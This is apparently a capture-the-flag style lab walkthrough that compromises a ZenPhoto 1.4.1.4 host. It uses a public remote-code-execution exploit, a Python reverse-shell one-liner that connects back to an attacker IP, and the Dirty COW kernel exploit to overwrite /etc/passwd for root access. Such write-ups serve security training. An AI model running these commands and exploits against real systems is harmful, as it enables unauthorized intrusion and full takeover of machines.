# ZenPhoto

### Enumeration

```
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

```
/test

<!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  -->
```

ZenPhoto 1.4.1.4 - 'ajax\_create\_folder.php' Remote Code Execution

https://www.exploit-db.com/exploits/18083

### Initial Access

```
$ php 18083 192.168.234.41 /test/
zenphoto-shell# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

zenphoto-shell# which python
/usr/bin/python

zenphoto-shell# export RHOST="192.168.49.234";export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### PrivEsc

```
OS: Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010
```

Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE\_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) - https://www.exploit-db.com/exploits/40839

[https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c)

```
gcc -pthread dirty.c -o dirty -lcrypt
./dirty

/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: pass123

$ ssh firefart@192.168.234.41
```
